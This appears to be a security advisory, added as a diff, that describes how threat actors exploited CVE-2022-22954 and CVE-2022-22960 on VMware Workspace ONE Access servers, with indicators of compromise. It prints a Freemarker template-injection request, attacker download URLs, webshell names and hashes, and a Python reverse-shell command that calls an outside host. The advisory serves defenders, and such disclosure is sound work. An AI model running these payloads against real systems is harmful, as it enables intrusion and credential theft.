@@ -1,0 +1,33 @@
+Threat Actor 1
+On April 12, TA1 exploited CVE 2022-22954 to download a malicious shell script from https://20.232.97[.]189/up/80b6ae2cea.sh. 
+
+TA1 first targeted Freemarker—a legitimate application that allows for customized notifications by creating templates—to send the following customized GET request URI to the compromised server:
+
+GET /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22cat%20/usr/local/horizon/conf/system-config.properties%22%29%7DHTTP/1.1
+
+The GET request resulted in the server downloading the malicious shell script, 80b6ae2cea[.]sh, to VMware Workspace ONE Access directory /usr/local/horizon/scripts/. TA1 then chained CVE 2022-22960 to the initial exploit to run the shell script with root privileges. The script was executed with the SUDO command.
+
+The script, which contained VMware Workspace ONE Access directory paths and file locations, was developed for data exfiltration. The malicious script collected [TA0009] sensitive files–including user names, passwords, master keys, and firewall rules–and stored them in a “tar ball” (a “tar ball” is a compressed and zipped file used by threat actors for collection and exfiltration). The tar ball was located in a VMWare Workspace ONE Access directory: /opt/vmware/horizon/workspace/webapps/SAAS/horizon/images/.
+
+The malicious script then deleted evidence of compromise by modifying logs to their original state and deleting files. TA1 deleted many files and logs, including fd86ald0.pem,  localhost_access logs, logs associated with the VMWare Horizon application, and greenbox logs for the date of activity (April 12).  
+
+Note: CISA received a similar malicious Bash script for analysis from a trusted third party at a different known compromise. See Victim 2 section for more information.
+
+On April 12, TA1 also downloaded jtest.jsp, a JSP webshell, to the server’s web directory /SAAS/Horizon/js-lib/ from IP address 186.233.187[.]245.
+
+TA1 returned to the server on April 12 to collect sensitive data stored in the “tar ball” by GET request.
+
+Threat Actor 2
+On April 13 and 14, TA2 sent many GET requests to the server exploiting—or attempting to exploit—CVE 2022-22954 to obtain RCE, upload binaries, and upload webshells for persistence.
+
+On April 13, TA2 attempted to download a webshell app.jsp (MD5 4cd8366345ad4068feca4d417738b4bd) from IP address 51.79.171[.]53. app.jsp is a publicly available webshell known as Godzilla.
+On April 13, TA2 downloaded a JSP webshell (MD 5 F8FF5C72E8FFA2112B01802113148BD1) from http://84.38.133[.]149/img/icon1.gif.
+On April 13, TA2 sent thousands of Unix commands from IP address 84.38.133[.]149, some of which enabled TA2 to view /etc/passwd and /etc/shadow password files. The Unix commands included whoami, id, and cat.
+The trusted third party found two copies of the Dingo J-spy webshell (MD5 5b0bfda04a1e0d8dcb02556dc4e56e6a) in web directories: horizon_all.jsp was in the /opt/vmware/horizon/workspace/webapps/SAAS/horizon/portal/ web directory and jquery.jsp was in the /webapps/cas/static/ directory. The third party was unable to determine how and when the webshells were created. TA2 used POST requests to communicate with the Dingo J-spy webshells. The commands and output were encrypted with an XOR key.
+
+On April 14, TA2 downloaded a reverse SOCKS proxy. TA2 first sent a GET request with the CHMOD command to change the permissions of .tmp12865xax, a hidden file in the /tmp directory. The actor then downloaded a binary (MD5  dc88c5fe715b5f706f9fb92547da948a) from https://github[.]com/kost/revsocks/releases/download/v1.1.0/revsocks_linux_amd64. The binary is a reverse socks5 tunneling binary with TLS/SSL support and connects to https://149.248.35[.]200.sslip.io.
+
+Additional Threat Actor Activity
+The trusted third party observed additional threat actor activity that does not seem to be related to TA1 or TA2. On 13 April, IP address 172.94.89[.]112 attempted to connect a reverse shell on the compromised server to IP Address 100.14.239[.]83 on port 5410. The threat actor used the following command:
+
+freemarker.template.utility.Execute\"?new()(\"/usr/bin/python3.7 -c  \\'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s. connect((\\\"100[.]14[.]239[.]83\\\",5410));os.dup2(s.fileno(),0);  os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/usr/bin/sh\\\",\\\"- i\\\"]);\\'\")}  
